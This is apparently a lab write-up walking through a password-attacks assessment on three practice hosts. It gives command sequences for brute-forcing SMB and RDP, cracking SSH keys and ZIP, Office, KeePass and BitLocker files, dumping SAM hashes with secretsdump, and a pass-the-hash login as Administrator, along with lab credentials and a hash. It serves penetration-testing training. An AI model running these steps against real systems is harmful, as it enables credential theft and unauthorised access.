  * From the bruteforcing of FTP, we get creds 'mike:7777777' - we can use this to log into FTP:

    ```sh
    ftp password-attacks-1.htb
    
    ls
    # we have 3 files

    mget *
    # fetch all files
    ```
  
  * We get the SSH keys from this FTP share - we can use this to log into the box:

    ```sh
    # we can first crack the id_rsa file
    chmod 600 id_rsa

    ssh2john id_rsa > hash_id_rsa

    john --wordlist=password.list hash_id_rsa
    # this gives passphrase '7777777'

    ssh mike@password-attacks-1.htb -i id_rsa

    ls -la
    # check files in mike home directory for any clues

    less .bash_history
    # this contains cleartext password "dgb6fzm0ynk@AME9pqu"

    su -
    # switch to root user
    # this password works
    ```

* Password Attacks Lab - Medium:

  * Map given machine to ```password-attacks-2.htb``` in ```/etc/hosts```

  * Scan given machine - ```nmap -T4 -p- -A -Pn -v password-attacks-2.htb```

  * We have SSH on port 22 and SMB on ports 139 & 445

  * Footprinting SMB:

    ```sh
    smbclient -N -L //password-attacks-2.htb
    # we have print$, SHAREDRIVE and IPC$

    smbclient //password-attacks-2.htb/SHAREDRIVE
    # this works without password

    dir
    # we have a .zip file

    get Docs.zip

    exit
    ```
  
  * We can inspect the zip file further:

    ```sh
    unzip Docs.zip
    # this requires a password

    zip2john Docs.zip > docs_zip_hash

    john --wordlist=password.list docs_zip_hash
    # this does not work

    # we can try other wordlists as well
    # such as rockyou.txt and the mutated password wordlist created earlier

    john --wordlist=/usr/share/wordlists/rockyou.txt docs_zip_hash

    john --wordlist=mut_pass.list docs_zip_hash
    # this gives us the password "Destiny2022!"

    unzip Docs.zip
    # use above password

    # we get a .docx file
    ```
  
  * We cannot open the '.docx' file as expected, and the ```file``` command shows that it is CDFV2 encrypted. [According to Google](https://ctftime.org/writeup/25044), it seems we can use ```office2john``` for cracking and ```msoffcrypto-tool``` to decrypt:

    ```sh
    office2john Documentation.docx > docx_hash

    john --wordlist=mut_pass.list docx_hash
    # this gives us the password "987654321"

    # for decryption
    pip install msoffcrypto-tool

    msoffcrypto-tool Documentation.docx decrypted.docx -p 987654321

    file decrypted.docx
    # Microsoft Word 2007+ file
    # we can view this online
    ```
  
  * The decrypted document mentions steps to build a local repository - we get the following findings from it:

    * MySQL server with default username 'root' and no password
    * Repo hosted locally at <http://localhost:8080/cms>; '/config' directory also used
    * Credentials mentioned - "jason:C4mNKjAtL2dydsYa6"
  
  * We can try to get SSH access using the creds found from the document:

    ```sh
    ssh jason@password-attacks-2.htb
    # it works

    ls -la
    # enumerate home directory

    sudo -l
    # nothing found

    ls -la /home
    # we have one more user

    ls -la /home/dennis
    # enumerate this home directory too
    # we get 'permission denied' for most of the files

    ss -ltnp
    # check for any internal services

    # we can start by checking mysql
    mysql -u root -p
    # empty password or jason password does not work

    mysql -u jason -p
    # empty password does not work
    # but jason creds works

    show databases;

    use users;

    show tables;

    select * from creds;
    # gives us creds "dennis:7AUgWWQEiMPdqx"

    exit

    su dennis

    cd
    # now we can enumerate dennis home directory

    ls -la .ssh
    # we have dennis SSH keys here

    sudo -l
    # nothing found

    # we can get dennis SSH key for now
    cat ~/.ssh/id_rsa
    # copy key contents

    # in attacker machine
    vim dennis_id_rsa
    # paste key contents, no newline

    chmod 600 dennis_id_rsa

    # crack key to get passphrase
    ssh2john dennis_id_rsa > dennis_id_rsa_hash

    john --wordlist=mut_pass.list dennis_id_rsa_hash
    # this gives us passphrase "P@ssw0rd12020!"

    su -
    # switching from dennis to root does not work with above passwords
    
    # we can try to reuse same password for root, but in SSH login
    ssh root@password-attacks-2.htb
    # we need key file

    ssh root@password-attacks-2.htb -i dennis_id_rsa
    # check password re-use
    # this works

    cat /root/flag.txt
    ```

* Password Attacks Lab - Hard:

  * Map given Windows client ```password-attacks-3.htb``` in ```/etc/hosts```

  * It is given that we have a user 'Johanna'

  * Scan given machine - ```nmap -T4 -p- -A -Pn -v password-attacks-3.htb```

  * Open ports & services:

    * 111/tcp - rpcbind
    * 135/tcp - msrpc
    * 139/tcp - netbios-ssn
    * 445/tcp - microsoft-ds
    * 2049/tcp - nfs
    * 3389/tcp - ms-wbt-server
    * 5985/tcp - http
    * 47001/tcp - http

  * ```nmap``` also shows target Windows machine name 'WINSRV'

  * Enumerating SMB, NFS:

    ```sh
    smbclient -N -L //password-attacks-3.htb
    # NT_STATUS_ACCESS_DENIED

    rpcclient -U "" password-attacks-3.htb

    showmount -e password-attacks-3.htb
    # nothing found
    ```
  
  * As we have been given a username, we can do a bruteforce attempt to check:

    ```sh
    # checking with both normal password wordlist and mutated password wordlist
    # hydra gives error so we can use msfconsole module

    vim win-users.txt
    # add 'johanna' and 'Johanna' in this file
    # as we are not sure about capital letter

    msfconsole -q

    use auxiliary/scanner/smb/smb_login

    options
    # set the options

    set RHOSTS password-attacks-3.htb
    set USER_FILE ~/pw-attacks/win-users.txt
    set PASS_FILE ~/pw-attacks/password.list

    # this does not work

    # we can try with other wordlist
    set PASS_FILE ~/pw-attacks/mut_pass.list

    run
    ```
  
  * On bruteforcing SMB, we get the creds "johanna:1231234!" (this works for 'Johanna' as well). We can check SMB shares for the workgroup 'WINSRV':

    ```sh
    crackmapexec smb password-attacks-3.htb -u 'johanna' -p '1231234!' --shares
    # lists shares - ADMIN$, C$, david and IPC$

    smbclient -U johanna \\\\password-attacks-3.htb\\ADMIN$
    # NT_STATUS_ACCESS_DENIED
    
    # nothing from other shares
    ```
  
  * We have a non-standard share named 'david', but we cannot access this; this also shows we can have an user named 'david'

  * With the two usernames 'johanna' and 'david', we can bruteforce the services again for any leads:

    ```sh
    vim win-users.txt
    # 'david' and 'johanna'

    # bruteforce SMB again using metasploit

    msfconsole -q

    use auxiliary/scanner/smb/smb_login

    set RHOSTS password-attacks-3.htb
    set USER_FILE ~/pw-attacks/win-users.txt
    set PASS_FILE ~/pw-attacks/password.list

    run

    # try with mutated passwords

    set PASS_FILE ~/pw-attacks/mut_pass.list

    run
    ```

    ```sh
    # bruteforce RDP
    # if needed, we can use cme for bruteforcing as well
    hydra -L win-users.txt -P password.list rdp://password-attacks-3.htb -t 4 -u

    hydra -L win-users.txt -P mut_pass.list rdp://password-attacks-3.htb -t 4 -u
    # johanna creds work for RDP as well
    ```
  
  * We can get RDP session for 'johanna' for further enumeration:

    ```sh
    xfreerdp /v:password-attacks-3.htb /u:johanna /p:'1231234!'
    # the RDP screen is blank for some reason

    remmina
    # while trying with remmina, it gives the domain 'INLANEFREIGHT.HTB' in error message
    # we also get cert-related errors
    # we can include that and check

    xfreerdp /v:password-attacks-3.htb /u:johanna /p:'1231234!' /d:inlanefreight.htb /cert:ignore /dynamic-resolution
    # this works
    ```
  
  * As we have RDP access, we can open File Explorer and start manual enumeration first. We can also enable settings to view hidden files & folders.

  * The Recent Files section shows a file 'Logins.kdbx' in the Documents folder; the Downloads folder has some useful tools for inspection, but nothing much other than these files

  * We can transfer the .kdbx file to our machine:

    ```ps
    # as it is a small file, we can use PowerShell base64 method

    # in PowerShell, get MD5 hash of file
    Get-FileHash "C:\Users\johanna\Documents\Logins.kdbx" -Algorithm MD5 | select Hash

    # convert file to base64
    [Convert]::ToBase64String((Get-Content -path "C:\Users\johanna\Documents\Logins.kdbx" -Encoding byte))
    # copy the complete base64 string

    # in attacker machine
    echo <base64 string> | base64 -d > Logins.kdbx

    md5sum Logins.kdbx
    # the MD5 hash should match

    # this is a KeePass file
    # we can attempt to crack it

    keepass2john Logins.kdbx > keepass-hash

    john --wordlist=mut_pass.list keepass-hash
    # this gives us the password "Qwerty7!"

    # we can open .kdbx file using Keepass
    sudo apt install keepassx

    keepassxc
    # open the database file and use the above password
    ```
  
  * From the Keepass database that we found, we get an entry for 'Adm', which includes the creds 'david:gRzX7YbeTcDG7' - we can use this to check the SMB shares discovered initially:

    ```sh
    smbclient -U david \\\\password-attacks-3.htb\\david
    # we get access
    
    dir
    # we have a .vhd file here

    get Backup.vhd

    exit
    ```
  
  * The .vhd file can be further inspected by mounting it; I tried [mounting VHD files in Linux](https://infinitelogins.com/2020/12/11/how-to-mount-extract-password-hashes-vhd-files/) but it did not work:

    ```sh
    sudo apt-get install libguestfs-tools cifs-utils

    sudo mkdir /mnt/win-vhd

    sudo guestmount --add Backup.vhd --inspector --ro -v /mnt/win-vhd
    # mount the vhd file in read-only mode
    ```
  
  * While attempting to mount the .vhd file, we get the prompt 'Enter key or passphrase ("/dev/sda2")' - this also refers BitLocker

  * It seems the VHD file is most likely encrypted with BitLocker - we need to crack the decryption before mounting it:

    ```sh
    bitlocker2john -i Backup.vhd > backup.hashes
    
    less backup.hashes
    # this gives us 4 different hashes
    # we need only backup hash

    grep "bitlocker\$0" backup.hashes > backup.hash

    hashcat -m 22100 backup.hash mut_pass.list -o backup.cracked
    # trying it with shorter wordlist before going for rockyou.txt
    # it works
    ```
  
  * We are able to crack the BitLocker encryption to get the passphrase "123456789!"; we can try mounting the VHD file again now but it still does not work:

    ```sh
    sudo guestmount --add Backup.vhd --inspector --ro -v /mnt/win-vhd
    # even after using the correct passphrase we get an error
    ```
  
  * Since this method does not work due to BitLocker encryption, we will have to use a slightly different method for [mounting BitLocker encrypted VHD files](https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0); (I tried mounting the VHD file after getting RDP access with Johanna's creds, but it requires Administrator credentials, so the only alternative to mounting on Linux is to mount on a local Windows system):

    ```sh
    # insert nbd modules in kernel
    sudo modprobe nbd

    # mount vhd file
    sudo qemu-nbd -c /dev/nbd0 Backup.vhd

    lsblk
    # identify which partition is Bitlocker encrypted partition
    # nbd0 - 130M - this has two sub-partitions
    # nbd0p1 - 16M and nbd0p2 - 112M

    # so the required partition is the second one
    sudo cryptsetup bitlkOpen /dev/nbd0p2 random_label
    # run cryptsetup and provide a label for mounting Bitlocker partition

    # here, we are asked the passphrase - we can use the backup passphrase cracked earlier

    lsblk
    # we can see the newly labelled partition

    sudo mkdir /mnt/mydrive

    # mount the partition
    # /dev/mapper remains
    sudo mount /dev/mapper/random_label /mnt/mydrive
    
    tree /mnt/mydrive
    # we can see a brief info of available files
    # this includes 'SAM' and 'SYSTEM'

    cd /mnt/mydrive

    ls -la
    # we have SAM and SYSTEM files

    sudo cp SAM SYSTEM /home/sv/pw-attacks

    # we can gracefully close the Bitlocker partition now

    sudo umount /mnt/mydrive

    sudo cryptsetup bitlkClose random_label

    # now we can extract the hashes
    impacket-secretsdump -sam SAM -system SYSTEM local
    # this gives us the Administrator hash

    # we can do a PtH attack with evil-winrm
    evil-winrm -i password-attacks-3.htb -u Administrator -H e53d4d912d96874e83429886c7bf22a1

    # get the flag from Administrator Desktop
    ```
